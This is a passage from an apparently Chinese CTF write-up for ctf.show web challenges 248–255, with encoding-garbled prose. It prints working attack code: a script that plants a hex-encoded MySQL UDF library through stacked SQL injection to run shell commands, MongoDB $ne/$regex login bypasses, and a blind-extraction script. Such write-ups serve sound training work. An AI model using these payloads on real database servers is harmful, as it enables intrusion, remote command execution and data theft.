<h2 id="web248"><a href="#web248" class="headerlink" title="*web248"></a>*web248</h2><p>ä½¿ç”¨<code>å›½å…‰</code>å¸ˆå‚…çš„<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">å°å·¥å…·</a>å’Œ<code>yu22x</code>å¸ˆå‚…çš„<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125220318">è„šæœ¬</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://7f4bb2eb-823a-4218-9b38-670163bf025e.challenge.ctf.show/api/&quot;</span></span><br><span class="line">udf=<span class="string">&quot;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000&quot;</span></span><br><span class="line">udfs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(udf),<span class="number">5000</span>):</span><br><span class="line">    udfs.append(udf[i:i+<span class="number">5000</span>])</span><br><span class="line"><span class="comment">#å†™å…¥å¤šä¸ªæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> udfs:</span><br><span class="line">    url1=url+<span class="string">f&quot;?id=1&#x27;;SELECT &#x27;<span class="subst">&#123;i&#125;</span>&#x27; into dumpfile &#x27;/tmp/&quot;</span>+<span class="built_in">str</span>(udfs.index(i))+<span class="string">&quot;.txt&#x27;%23&quot;</span></span><br><span class="line">    requests.get(url1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆå¹¶æ–‡ä»¶ç”Ÿæˆsoæ–‡ä»¶</span></span><br><span class="line">url2=url+<span class="string">&quot;?id=1&#x27;;SELECT unhex(concat(load_file(&#x27;/tmp/0.txt&#x27;),load_file(&#x27;/tmp/1.txt&#x27;),load_file(&#x27;/tmp/2.txt&#x27;),load_file(&#x27;/tmp/3.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/hack.so&#x27;%23&quot;</span></span><br><span class="line">requests.get(url2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤</span></span><br><span class="line">requests.get(url+<span class="string">&quot;?id=1&#x27;;create function sys_eval returns string soname &#x27;hack.so&#x27;%23&quot;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;?id=1&#x27;;select sys_eval(&#x27;cat /f*&#x27;)%23&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sqlè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ— </span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$memcache</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p><code>Memcache</code>ç¼“å­˜æ•°æ®åº“ï¼Œä¼ å…¥æ•°ç»„å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id[]=flag&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>sqlè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ— è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mongodb</code>æ³¨å…¥ï¼Œä½¿ç”¨æ°¸çœŸå¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥é…ä¸Šæ­£åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=.*&amp;password[$regex]=.*</span><br><span class="line">username[$regex]=.&amp;password[$regex]=.</span><br><span class="line">username[$ne]=1&amp;password[$regex]=ct</span><br></pre></td></tr></table></figure>

<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>æŸ¥ä¸‹ç”¨æˆ·åä¸ç­‰äºadminçš„å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>ä½¿ç”¨æ­£åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$regex]=^ctfshow&#123;</span><br></pre></td></tr></table></figure>

<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>åˆ©ç”¨æ­£åˆ™è¿›è¡Œç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># letters = string.ascii_letters + string.digits + &#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">letters = <span class="string">&#x27;0123456789abcdef-&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://588fe024-d17c-4139-8dde-0b912e3070fe.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username[$ne]&quot;</span>: <span class="string">f&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">f&quot;^<span class="subst">&#123;flag+j&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&#x27;\u767b\u9646\u6210\u529f&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># ctfshow&#123;1839bec9-f8ee-49d4-af37-0a660031bd18&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ»¡è¶³è¦æ±‚å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>

<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>exp</code></p>
